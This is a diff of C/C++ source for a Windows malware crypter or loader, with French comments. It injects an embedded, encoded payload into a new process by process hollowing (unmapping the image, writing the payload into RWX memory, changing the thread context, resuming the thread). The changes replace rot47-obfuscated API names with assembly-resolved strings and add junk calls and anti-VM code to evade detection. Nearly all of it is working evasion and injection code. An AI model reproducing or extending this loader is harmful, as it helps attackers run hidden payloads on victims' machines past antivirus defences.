@@ -4,9 +4,10 @@
 int extern conv7to8(unsigned char *indata, unsigned char *outdata, int lenarray) asm ("_conv7to8") ; 
 int extern startrand() asm ("_startrand") ; // (unsigned char *);
 int extern findkernel() asm ("_findkernel") ; // (unsigned char *);
-int extern getfunction( int kernel, unsigned char *library ) asm ("_getfunction");
-unsigned char extern ostring(unsigned char *stringoff) asm ("_ostring") ; // (unsigned char *);
+int extern getfunction( int kernel, int library ) asm ("_getfunction");
+int extern ostring(unsigned char *stringoff) asm ("_ostring") ; // (unsigned char *);
 int extern str_ntdll() asm ("str_ntdll"); 
+int extern str_LoadLibrary() asm ("str_LoadLibrary"); 
 
 
 // Redeclaration des type des fonctions offusquee 
@@ -22,6 +23,9 @@ typedef LONG (WINAPI * PGetProcAddress)( HMODULE hModule,LPCSTR lpProcName );
 typedef LONG (WINAPI * PCreateProcessA)(LPCTSTR lpApplicationName,LPCSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
 typedef LONG (WINAPI * PReadProcessMemory)(HANDLE hProcess,LPCVOID lpBaseAddress,LPVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesRead);
 typedef HINSTANCE (WINAPI * PLoadLibrary ) ( LPCTSTR lpLibFileName ); 
+typedef LPVOID( WINAPI * PVirtualAllocEx) (HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
+
+
 
 // VM scarving
 int vaauxfraises(int x) {
@@ -68,52 +72,40 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 	PCreateProcessA xCreateProcessA;
 	PReadProcessMemory xReadProcessMemory;
 	PLoadLibrary xLoadLibrary;
+	PVirtualAllocEx xVirtualAllocEx;
 
 	LPVOID pImageBase;
 	int Count;
 
 
-// 	HINSTANCE aKERNEL32;
-  char vNTDLL[]="?E5==";
-	char vKERNEL32[]="<6C?6=ba";
-	char vNtResumeThread[]="}E#6DF>6%9C625";
-	char vWriteProcessMemory[]="(C:E6!C@46DD|6>@CJ";
-	char vGetThreadContext[]="v6E%9C625r@?E6IE";
-	char vSetThreadContext[]="$6E%9C625r@?E6IE";
-  char vNtUnmapViewOfSection[]="}E&?>2A':6H~7$64E:@?";
-  char vGetProcAddress[]="v6E!C@4p55C6DD";
-	char vCreateProcessA[]="rC62E6!C@46DDp";
-	char vReadProcessMemory[]="#625!C@46DD|6>@CJ";
-  char vLoadLibrary[]="{@25{:3C2CJ";
+int extern str_ntdll() asm ("str_ntdll"); 
+int extern str_kernel32() asm ("str_kernel32"); 
+int extern str_ReadProcessMemory() asm ("str_ReadProcessMemory"); 
+int extern str_GetProcAddress() asm ("str_GetProcAddress"); 
+int extern str_ReadProcAddress() asm ("str_ReadProcAddress"); 
+int extern str_WriteProcessMemory() asm ("str_WriteProcessMemory"); 
+int extern str_GetThreadContext() asm ("str_GetThreadContext"); 
+int extern str_SetThreadContext() asm ("str_SetThreadContext");
+int extern str_ReadProcessMemory() asm ("str_ReadProcessMemory"); 
+int extern str_CreateProcessA() asm ("str_CreateProcessA"); 
+int extern str_NtResumeThread() asm ("str_NtResumeThread");
+int extern str_NtUnmapViewOfSection() asm ("str_NtUnmapViewOfSection"); 
+int extern str_VirtualAllocEx() asm ("str_VirtualAllocEx"); 
 
- 	rot47(vNTDLL);
-  rot47(vKERNEL32);
-	rot47(vNtResumeThread);
-	rot47(vWriteProcessMemory);
-	rot47(vGetThreadContext);
-	rot47(vSetThreadContext);
-  rot47(vNtUnmapViewOfSection);
-	rot47(vGetProcAddress);
-	rot47(vCreateProcessA);
-	rot47(vReadProcessMemory);
-	rot47(vLoadLibrary);
+xLoadLibrary = (PLoadLibrary) getfunction (findkernel() ,ostring((unsigned char *) &str_LoadLibrary ));
+	
+	HINSTANCE Hkernel32  = xLoadLibrary((LPCTSTR) ostring((unsigned char *) &str_kernel32 ));
+	HINSTANCE Hntdll = xLoadLibrary((LPCTSTR) ostring((unsigned char * ) &str_ntdll ));
 
-  xLoadLibrary = (PLoadLibrary) getfunction (findkernel() ,(unsigned char *) vLoadLibrary );
-	HINSTANCE Hkernel32  = xLoadLibrary(vKERNEL32);
-	HINSTANCE Hntdll = xLoadLibrary(vNTDLL);
-
-	xGetProcAddress = (PGetProcAddress) getfunction(findkernel(),(unsigned char *)vGetProcAddress);
-  xReadProcessMemory = (PReadProcessMemory) getfunction(findkernel(),(unsigned char *)vReadProcessMemory);
-//	xReadProcessMemory = PReadProcessMemory(xGetProcAddress(Hkernel32,vReadProcessMemory));
-	xWriteProcessMemory = (PWriteProcessMemory)  getfunction(findkernel(),(unsigned char *)vWriteProcessMemory);
- xCreateProcessA = PCreateProcessA(xGetProcAddress(Hkernel32,vCreateProcessA));
-//	xWriteProcessMemory = PWriteProcessMemory(xGetProcAddress(Hkernel32,vWriteProcessMemory));
-xNtResumeThread = PNtResumeThread(xGetProcAddress(Hntdll,vNtResumeThread));	
-	xGetThreadContext = ( PGetThreadContext) getfunction(findkernel(),(unsigned char *)vGetThreadContext);
-//	xGetThreadContext = PGetThreadContext(xGetProcAddress(Hkernel32,vGetThreadContext));
-	xSetThreadContext = ( PSetThreadContext) getfunction(findkernel(),(unsigned char *)vSetThreadContext);
-//	xSetThreadContext = PSetThreadContext(xGetProcAddress(Hkernel32,vSetThreadContext));
-	xNtUnmapViewOfSection = (PNtUnmapViewOfSection)(xGetProcAddress(Hntdll,vNtUnmapViewOfSection));
+	xGetProcAddress = (PGetProcAddress) getfunction(findkernel(),ostring((unsigned char *) &str_GetProcAddress));
+  xReadProcessMemory = (PReadProcessMemory) getfunction(findkernel(), ostring((unsigned char *)&str_ReadProcessMemory));
+	xWriteProcessMemory = (PWriteProcessMemory)  getfunction(findkernel(),ostring((unsigned char *)&str_WriteProcessMemory));
+	xCreateProcessA = (PCreateProcessA) (xGetProcAddress(Hkernel32,(LPCSTR) ostring((unsigned char *) &str_CreateProcessA)));
+	xNtResumeThread = (PNtResumeThread)(xGetProcAddress(Hntdll,(LPCSTR) ostring((unsigned char *) &str_NtResumeThread)));	
+	xGetThreadContext = ( PGetThreadContext) getfunction(findkernel(),ostring((unsigned char *)&str_GetThreadContext));
+	xSetThreadContext = ( PSetThreadContext) getfunction(findkernel(),ostring((unsigned char *)&str_SetThreadContext));
+	xNtUnmapViewOfSection = (PNtUnmapViewOfSection)(xGetProcAddress(Hntdll,(LPCSTR) ostring((unsigned char *)&str_NtUnmapViewOfSection)));
+	xVirtualAllocEx = ( PVirtualAllocEx) getfunction(findkernel(),ostring((unsigned char *)&str_VirtualAllocEx));
 
 	IDH = PIMAGE_DOS_HEADER(pFile);
 	if (IDH->e_magic == IMAGE_DOS_SIGNATURE) { // TEST MZ
@@ -135,18 +127,21 @@ xNtResumeThread = PNtResumeThread(xGetProcAddress(Hntdll,vNtResumeThread));
 					xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
 				  }
 
-				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+				pImageBase = xVirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
 				if (pImageBase) {
 			//	HMODULE aKERNEL32=LoadLibrary(vKERNEL32);
 					xWriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
 					for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
 						ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
-						xWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
+	
+					startrand();
+	xWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
 					}
 					xWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
 					CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
 					// Et on demarre la thread
 					xSetThreadContext(PI.hThread, LPCONTEXT(CTX));
+					startrand();
 					xNtResumeThread(PI.hThread);
 				}
 			}
@@ -177,14 +172,10 @@ int payloadlen7;
 int main()
 
 {
-asm ( "nop" );
-ostring((unsigned char*) &str_ntdll); // Deguelasse mais marche.
-asm ( "nop" );
 
-
+int dummy = vaauxfraises(41414141);
 buffer = (unsigned char*) malloc (payloadlen);
 payloadlen7=conv7to8( payload,buffer,payloadlen);
-int dummy = vaauxfraises(41414141);
 
 
 
